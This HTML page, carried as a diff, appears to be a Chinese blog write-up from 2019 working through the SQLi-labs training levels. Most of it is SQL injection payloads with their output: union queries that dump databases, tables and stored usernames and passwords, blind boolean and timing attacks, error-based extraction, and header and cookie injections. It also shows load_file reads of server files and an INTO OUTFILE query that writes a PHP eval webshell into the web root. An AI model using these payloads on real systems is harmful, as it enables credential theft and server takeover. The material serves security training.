@@ -1,0 +1,661 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQLi-labs Basic Challenges | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SQLi-labs Basic Challenges | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+Error based
+
+下面以 Less 1 GET-Error based-Single quotes-String 为例分析:
+$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT ..." />
+    <meta name="keywords" content="SQLi,Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SQLi-labs Basic Challenges
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-04-25
+              </span>
+              <span>
+                13 min read
+              </span>
+              <span class="page-view" key="20190425205400" title="SQLi-labs Basic Challenges">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/sqli/" class="post-tag">
+                  # SQLi
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549198143185-cba3a637-7d3e-4215-a1e7-662142310b4f.png" alt="" loading="lazy"></figure>
+<h2 id="error-based">Error based</h2>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549200569009-2d90d538-099a-4fbd-8a0b-2f4cc5e5d50f.png" alt="" loading="lazy"></figure>
+<p>下面以 <strong>Less 1 GET-Error based-Single quotes-String</strong> 为例分析:</p>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+</code></pre>
+<p><code>id=1'</code> 返回</p>
+<pre><code class="language-sql">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+</code></pre>
+<p><code>id=1' or 1=1 --+</code> 正常返回结果。</p>
+<p><code>id = 1' ORDER BY 3 --+</code> 正常返回结果。</p>
+<p><code>id = 1' ORDER BY 4 --+</code> 返回<code>Unknown column '4' in 'order clause'</code>， 判断 <code>user</code>表存在3列数据。</p>
+<ul>
+<li>爆数据库</li>
+</ul>
+<p><code>id = -1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code></p>
+<pre><code class="language-sql">SELECT * FROM users WhERE id = '-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--+' LIMIT 0,1
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549195342935-7b56b398-2e05-4524-a2d3-62bdd69a6f90.png" alt="" loading="lazy"></figure>
+<ul>
+<li>爆(security)数据表</li>
+</ul>
+<p><code>id=-1' union select 1,group_concat(table_name),3 from information_schema.tables WHERE table_schema='security' --+</code></p>
+<pre><code class="language-sql">SELECT * FROM users WhERE id = '-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security' --+' LIMIT 0,1
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549195726863-9927dde1-73e7-40e8-8949-232995945cdc.png" alt="" loading="lazy"></figure>
+<ul>
+<li>爆(users)列</li>
+</ul>
+<p><code>id=id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema = 'security' AND table_name='users' --+</code></p>
+<pre><code class="language-sql">SELECT * FROM users WhERE id = '-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE  table_schema = 'security' AND table_name='users' --+` LIMIT 0,1
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549196119537-bec64921-7bfc-479f-8292-10520cb8e005.png" alt="" loading="lazy"></figure>
+<ul>
+<li>爆数据</li>
+</ul>
+<p><code>id=-1' UNION SELECT id,username,password FROM users WHERE id = 3 --+</code></p>
+<pre><code class="language-sql">SELECT * FROM users WhERE id = '-1' UNION SELECT id,username,password FROM  users WHERE id = 3 --+` LIMIT 0,1
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549196396683-3511de3a-b925-414d-9f2e-135eed456e00.png" alt="" loading="lazy"></figure>
+<h2 id="double-injection">Double Injection</h2>
+<pre><code class="language-sql">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+</code></pre>
+<p><code>id=1' or 1=1 --+</code>回显<code>You are in...........</code>。</p>
+<h3 id="布尔盲注">布尔盲注</h3>
+<p><strong>1.猜数据库名</strong></p>
+<p>利用<code>left(version(),1)</code>进行尝试，<code>id=1' AND left(version(), 1)=5 --+</code>回显正常。</p>
+<ul>
+<li>
+<p><code>length(database())</code>查看数据库名长度，<code>id=1' AND length(database())=8--+</code>回显正常。</p>
+</li>
+<li>
+<p><code>left(database(),1) &gt; 'a'</code>猜测数据库名，<code>id=1' AND left(database(),1) &gt; 'a' --+</code>回显正常。</p>
+</li>
+</ul>
+<p>--&gt; <code>security</code>。</p>
+<p><strong>2.获取数据库下的表</strong></p>
+<p>利用<strong>substr()</strong>、<strong>ascii()</strong> 函数进行尝试。</p>
+<pre><code class="language-sql">ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1), 1, 1)) = 101 #email
+</code></pre>
+<pre><code class="language-sql">ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1),1,1))&gt;80 #二分法
+</code></pre>
+<p>第一个表应为<code>email</code>，获取第二个表<code>refers</code>(LIMIT 1,1)。</p>
+<pre><code class="language-sql">ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1,1),1,1))&gt;113--+ 
+</code></pre>
+<p><strong>3.获取表中的列</strong></p>
+<p>利用<code>regexp</code>获取<code>user</code>表中的列。</p>
+<pre><code class="language-sql"># 测试表中是否包含 username 的列
+1 = (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name regexp '^username' limit 0,1)--+
+</code></pre>
+<p>同理可判断<code>username</code>、<code>password</code>等列是否存在。</p>
+<p><strong>4.获取表中的内容</strong></p>
+<pre><code class="language-sql">#获取user表中username列的第一条记录的第一个字符的ascii与68(D)进行比较 --&gt; Dumb
+ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+
+</code></pre>
+<h3 id="报错盲注">报错盲注</h3>
+<pre><code class="language-sql">UNION SELECT 1,count(*),concat(0x3a, 0x3a, (SELECT user()),0x3a,0x3a,floor(rand(0)*2))a FROM information_schema.columns GROUP BY a--+
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549204477936-e36325ca-df26-4a82-a86e-bb38f6a66f99.png" alt="" loading="lazy"></figure>
+<hr>
+<ul>
+<li><a href="https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/">BIGINT Overflow Error Based SQL Injection</a></li>
+<li><a href="https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/">Error Based SQL Injection Using EXP</a></li>
+</ul>
+<hr>
+<p>利用double数值类型超出范围进行报错注入:</p>
+<pre><code class="language-sql">UNION SELECT (exp(~(SELECT * FROM (SELECT user())a))),2,3 --+
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549204704344-e27ead96-e984-40ea-8e07-748e75ac5d91.png" alt="" loading="lazy"></figure>
+<p>利用bigint溢出进行报错注入：</p>
+<pre><code class="language-sql">UNION SELECT (!(SELECT * FROM (SELECT user())x) - ~0),2,4 --+
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549205141215-9fb46d96-672c-45cc-977c-d30cd38910ae.png" alt="" loading="lazy"></figure>
+<p>利用xpath函数报错注入：</p>
+<pre><code class="language-sql"># mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误 
+AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --+
+AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1) --+
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549205345651-77b286e1-921d-4506-9dd2-31cca35f41ef.png" alt="" loading="lazy"></figure>
+<p>利用数据的重复性报错注入:</p>
+<pre><code class="language-sql"># mysql 重复特性，此处重复了 version，所以报错。
+UNION SELECT 1,2,3 FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x --+
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549205633106-9eee82e3-f21c-4bb6-8f91-354fcbe0746d.png" alt="" loading="lazy"></figure>
+<h3 id="延时注入">延时注入</h3>
+<ul>
+<li>利用sleep()函数进行注入：</li>
+</ul>
+<pre><code class="language-sql"># 当有错误时会有5s的时间延时
+AND if(ascii(substr(database(),1,1)) = 115, 1, sleep(5)) --+
+</code></pre>
+<ul>
+<li>利用 benchmark()进行延时注入：</li>
+</ul>
+<pre><code class="language-sql"># 结果正确时候将运行encode('MSG', 'by 5 seconds')操作50000000次，会占用一段时间
+UNION SELECT (if(substring(current, 1, 1) = CHAR(115), benchmark(50000000, encode('MSG', 'by 5 seconds')), null)),2,3 FROM (SELECT database() as current) as tb1--+
+</code></pre>
+<ul>
+<li>常见的延时注入方式</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">数据库类型</th>
+<th style="text-align:center">延时注入方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">MySQL</td>
+<td style="text-align:center">BENCHMARK(100000, MD5(1)) / SLEEP(5)</td>
+</tr>
+<tr>
+<td style="text-align:center">PostgreSQL</td>
+<td style="text-align:center">PG_SLEEP(5) / GENERATE_SERIES(1, 10000)</td>
+</tr>
+<tr>
+<td style="text-align:center">Mssql Server</td>
+<td style="text-align:center">WAITFOR DELAY '0:0:5'</td>
+</tr>
+</tbody>
+</table>
+<h3 id="less-5-double-injection">Less 5 Double Injection</h3>
+<blockquote>
+<p>eg: <strong>Less 5 GET-Double Injection-Single Quotes-String</strong></p>
+</blockquote>
+<p><code>id=1'</code>回显<code>near ''1'' LIMIT 0,1'</code>，表明为<code>'</code>闭合。</p>
+<ul>
+<li>查看数据库版本号</li>
+</ul>
+<p><code>?id=1' and left(version(), 1)=5--+</code>, 回显<strong>You are in...........</strong>，错误则回显空内容。</p>
+<ul>
+<li>查看数据库长度</li>
+</ul>
+<p><code>?id=1' and length(database())=8--+</code>，数据库长度为<strong>8</strong>。</p>
+<ul>
+<li>猜数据库名</li>
+</ul>
+<pre><code class="language-sql"># 这里可以使用二分法
+?id=1' and left(database(), 1)='s'--+ --&gt; s
+?id=1' and left(database(), 2)&gt;'sa'--+ --&gt; You are in
+?id=1' and left(database(), 2)='se'--+ --&gt; se
+# 依次类推
+?id=1' and left(database(), 8) = 'security'--+ --&gt; security 
+</code></pre>
+<ul>
+<li>获取security下的数据表</li>
+</ul>
+<pre><code class="language-sql"># 利用函数substr()、ascii()进行尝试
+ascii(substr(select table_name from information_schema.tables where tables_schema=database() limit 0,1), 1, 1))=101 -&gt; e
+# 获取表的第二位
+substr(table_name, 2, 1)
+# 依次类推
+table1_name = email
+# 获取第二张表
+limit 2,1
+# 依次类推
+table2_name = referers
+</code></pre>
+<ul>
+<li>获取user表中的列</li>
+</ul>
+<p><strong>RegExp</strong> 正则匹配:<a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001434499503920bb7b42ff6627420da2ceae4babf6c4f2000">参考链接</a></p>
+<pre><code class="language-sql"># 判断user表中是否含有名为username的列
+and 1 = (select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+
+# 依次类推
+username, password
+</code></pre>
+<ul>
+<li>获取user表中的内容</li>
+</ul>
+<pre><code class="language-SQL"># 利用函数ord()、mid()进行尝试
+ORD(MID(SELECT IFNULL(CAST(username AS CHAR), 0X20) FROM security.users ORDER BY id limit 0,1),1,1))=68--+ --&gt; D
+# 以此类推
+Dump
+</code></pre>
+<p>Less 6 替换 <code>'</code> 为 <code>&quot;</code> 即可。</p>
+<h3 id="less-9-blind-time-based">Less 9 Blind Time-based</h3>
+<pre><code class="language-sql"># Payload
+# 猜测数据库
+# 正确时直接返回，不正确时等待5秒
+AND IF(ascii(substr(database(),1,1))=115,1,sleep(5))--+ --&gt;s
+# security
+# 猜数据表
+AND IF(ascii(substr(SELECT table_name FROM information_schema.tables WHERE table_shema='security' LIMIT 0,1))=101,1,sleep(5))--+
+# emails, referers, uagents, users
+# 猜Columns
+AND IF(ascii(substr(SELECT column_name FROM information_schema.columns WHERE table_name='users' limit 0,1)1,1)=1,1,sleep(5))--+
+# id, username, password
+# 猜字段
+AND IF(ascii(substr((SELECT username FROM users LIMIT 0,1),1,1))=68,1,sleep(5))--+
+</code></pre>
+<p>Less 10 替换<code>'</code>为<code>&quot;</code>即可。</p>
+<h2 id="导入导出">导入导出</h2>
+<h3 id="load_file导出文件">load_file()导出文件</h3>
+<p><strong>load_file()</strong>:读取文件并返回文件内容为字符串。</p>
+<table>
+<thead>
+<tr>
+<th>使用条件</th>
+<th>验证方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A.拥有file权限</td>
+<td>and (select count(*) from mysql.user()&gt;0/*返回正常</td>
+</tr>
+<tr>
+<td>B.文件必须位于服务器主机上</td>
+<td></td>
+</tr>
+<tr>
+<td>C.必须指定完整路径的文件</td>
+<td>MySQL注入load_file常用路径</td>
+</tr>
+<tr>
+<td>D.文件所有字节可读且文件内容必须小于max_allowed_packet</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p>
+<p>实际注入中的难点：<strong>绝对的物理路径</strong>、<strong>构造有效的畸形语句通过报错爆出绝对路径</strong>。</p>
+<blockquote>
+<p>参考：<a href="https://www.cnblogs.com/lcamry/p/5729087.html">MySQL注入load_file常用路径</a></p>
+</blockquote>
+<pre><code class="language-sql"># 示例
+select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))
+# Explain: 利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用。
+select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))
+# Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码
+select 1,1,1,load_file(0x633a2f626f6f742e696e69)
+# Explain：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”
+select 1,1,1,load_file(c:\\boot.ini)
+# Explain:路径里的/用 \\代替
+</code></pre>
+<h3 id="文件导入到数据库">文件导入到数据库</h3>
+<pre><code class="language-sql"># The LOAD DATA statement reads rows from a text file into a table at a very high speed. 
+LOAD DATA INFILE 'data.txt' INTO TABLE db2.my_table;
+# eg: 将/tmp/t0.txt导入到表t0中，字符集设置为gbk，每项数据间的分隔符设置为\t，每行的结尾符设置为\n
+LOAD DATA INFILE '/tmp/t0.txt' IGNORE INTO TABLE t0 CHARACTER SET gbk FIELDS TERMINATED BY '\t' LINES TERMINATED BY '\n'
+# 错误代码为2时：文件不存在。
+# 错误代码为13时： 没有权限，可以考虑/tmp等文件夹。
+</code></pre>
+<h3 id="导入到文件">导入到文件</h3>
+<pre><code class="language-sql"># Writes the selected rows to a file.
+SELECT.....INTO OUTFILE 'file_name'
+</code></pre>
+<p>两种利用形式:</p>
+<ul>
+<li>直接导入文件</li>
+</ul>
+<pre><code class="language-sql">SELECT &lt;?php @eval($_POST('mima'))?&gt; INTO OUFILE &quot;C:\\phpnow\\htdocs\\test.php&quot;
+</code></pre>
+<ul>
+<li>修改文件结尾</li>
+</ul>
+<blockquote>
+<p>参考：<a href="http://www.cnblogs.com/lcamry/p/5505110.html">sqlmap os shell解析</a></p>
+</blockquote>
+<pre><code class="language-sql"># 通常是用'\r\n'结尾，此处我们修改为自己想要的任何文件。0x16可以是一句话或其他任意文件。
+SELECT versions() INTO outfile &quot;c:\\phpnow\\htdocs\\test.php&quot; LINES TERMINATED BY 0x16
+# Tips
+# 1.文件路径可能需要转义，具体看环境。
+# 2.当前台无法导出数据的时候，可以尝试如下语句导出得到数据。
+SELECT load_file('c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini') INTO outfile 'c:\\wamp\\www\\test.php'
+# my.ini 当中存在 password 项（不过默认被注释）。
+</code></pre>
+<h3 id="less-7-dump-into-outfile">Less 7 Dump into outfile</h3>
+<ul>
+<li>判断闭合方式</li>
+</ul>
+<p><code>id=1'</code>回显：near <strong>'</strong>'1'')) LIMIT 0,1 <strong>'</strong> at line 1, 判断闭合方式为<code>(('$id'))</code>。</p>
+<ul>
+<li>测试columns</li>
+</ul>
+<p><code>ORDER BY 4</code>回显<code>You have an error in your SQL syntaxUnknown column '4' in 'order clause'</code>， 数据列数为3。</p>
+<ul>
+<li>导入一句话木马</li>
+</ul>
+<pre><code class="language-sql"># @@global.secure_file_priv /var/lib/mysql-files/
+UNION SELECT 1,2,'&lt;?php @eval($_POST[&quot;code&quot;])?&gt;' INTO outfile &quot;/var/www/sqli_lab/sqli-labs-php7/Less-7/shell.php&quot; --+
+</code></pre>
+<h2 id="增删改函数介绍">增删改函数介绍</h2>
+<pre><code class="language-sql"># INSERT 增加记录
+# 单条
+INSERT INTO &lt;表名&gt; (字段1, 字段2, ...) VALUES (值1, 值2, ...);
+# 多条
+INSERT INTO students (class_id, name, gender, score) VALUES
+  (1, '大宝', 'M', 87),
+  (2, '二宝', 'M', 81);
+
+# UPDATE 修改记录
+UPDATE &lt;表名&gt; SET 字段1=值1, 字段2=值2, ... WHERE ...;
+
+#DELETE 删除记录
+DELETE FROM &lt;表名&gt; WHERE ...;
+</code></pre>
+<h3 id="less-17-update-query-error-based">Less 17 Update Query-Error Based</h3>
+<p><code>uname=admin&amp;passwd=1'&amp;submit=Submit</code>发包后得到回显:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1</p>
+<pre><code class="language-sql">SELECT username, password FROM users WHERE username= $uname LIMIT 0,1
+</code></pre>
+<p>判断注入点位于<code>passwd</code>，闭合方式为<code>'</code>。</p>
+<p>尝试<code>xpath</code>报错注入：</p>
+<pre><code class="language-sql"># 爆库
+uname=admin&amp;passwd=1' or updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;submit=Submit
+# 回显: XPATH syntax error: '~security~'
+
+# 爆数据表
+uname=admin&amp;passwd=' or updatexml(1, concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)#&amp;submit=Submit
+# 回显：XPATH syntax error: '~emails,referers,uagents,users~'
+
+# 爆列
+uname=admin&amp;passwd=' or updatexml(1, concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' limit 3,1),0x7e),1)#&amp;submit=Submit
+# 回显: XPATH syntax error: '~id~' 
+# 3 id 4 username 5 password
+
+# 爆数据
+uname=admin&amp;passwd=' or updatexml(1,concat(0x7e,(select username from users),0x7e),1)#&amp;submit=Submit
+# 回显：You can't specify target table 'users' for update in FROM clause
+uname=admin&amp;passwd=' or updatexml(1,concat(0x7e,(select username from (select username from users)b limit 0,1),0x7e),1)#&amp;submit=Submit
+# 回显：XPATH syntax error: '~Dumb~'
+
+</code></pre>
+<p>通过查看代码我们发现:<code>$uname=check_input($_POST['uname']);</code>。</p>
+<pre><code class="language-php">function check_input($value)
+	{
+	if(!empty($value))
+		{
+		// truncation (see comments)
+		$value = substr($value,0,15);
+		}
+
+		// Stripslashes if magic quotes enabled
+		if (get_magic_quotes_gpc())
+			{
+			$value = stripslashes($value);
+			}
+
+		// Quote if not a number
+		if (!ctype_digit($value))
+			{
+			$value = &quot;'&quot; . mysql_real_escape_string($value) . &quot;'&quot;;
+			}
+		
+	else
+		{
+		$value = intval($value);
+		}
+	return $value;
+  }
+</code></pre>
+<h2 id="http-injection">HTTP Injection</h2>
+<h3 id="less-18-uagent-field-error-based">Less 18 Uagent field / Error based</h3>
+<p>username:admin,password:1;登录成功后显示<code>IP</code>(<strong>REMOTE_ADDR</strong>方式获取，不易伪造)以及<code>User Agent</code>信息, <strong>User-Agent</strong>字段存在注入点。</p>
+<pre><code class="language-sql"># Payload
+User-Agent: ' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
+# 回显
+XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'
+</code></pre>
+<h3 id="less-19-referer-field-error-based">Less 19 Referer field / Error based</h3>
+<pre><code class="language-sql"># code
+$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')&quot;;
+# payload
+' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
+# 回显
+XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'
+</code></pre>
+<h3 id="less-20-cookie-injection-uagent-field">Less 20 Cookie Injection / Uagent field</h3>
+<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551451323683-caaadf24-eec8-4d9d-bb7f-37084ed27a8f.png" alt="" loading="lazy"></figure>
+<p>Cookie: <code>uname = admin' and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</code>。</p>
+<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551451651325-788dfe81-f2f3-4d76-8a73-74401ed905d7.png" alt="" loading="lazy"></figure>
+<p>Less 21 、Less 22 <code>cookie</code>进行了base64 encode, 分别为单引号和双引号闭合，注入姿势相同~</p>
+<blockquote>
+<p>参考: 《MySQL注入天书》</p>
+</blockquote>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#error-based">Error based</a></li>
+<li><a href="#double-injection">Double Injection</a>
+<ul>
+<li><a href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">布尔盲注</a></li>
+<li><a href="#%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8">报错盲注</a></li>
+<li><a href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5">延时注入</a></li>
+<li><a href="#less-5-double-injection">Less 5 Double Injection</a></li>
+<li><a href="#less-9-blind-time-based">Less 9 Blind Time-based</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA">导入导出</a>
+<ul>
+<li><a href="#load_file%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6">load_file()导出文件</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93">文件导入到数据库</a></li>
+<li><a href="#%E5%AF%BC%E5%85%A5%E5%88%B0%E6%96%87%E4%BB%B6">导入到文件</a></li>
+<li><a href="#less-7-dump-into-outfile">Less 7 Dump into outfile</a></li>
+</ul>
+</li>
+<li><a href="#%E5%A2%9E%E5%88%A0%E6%94%B9%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D">增删改函数介绍</a>
+<ul>
+<li><a href="#less-17-update-query-error-based">Less 17 Update Query-Error Based</a></li>
+</ul>
+</li>
+<li><a href="#http-injection">HTTP Injection</a>
+<ul>
+<li><a href="#less-18-uagent-field-error-based">Less 18 Uagent field / Error based</a></li>
+<li><a href="#less-19-referer-field-error-based">Less 19 Referer field / Error based</a></li>
+<li><a href="#less-20-cookie-injection-uagent-field">Less 20 Cookie Injection / Uagent field</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-CTF-ljc-Web1-13-WriteUp/">
+                <h3 class="post-title" style="text-align: left;">
+                  CTF 论剑场 Web1-13 WriteUp
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-03-25-sqlmap-csrf-token/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  sqlmap CSRF-token 绕过姿势
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
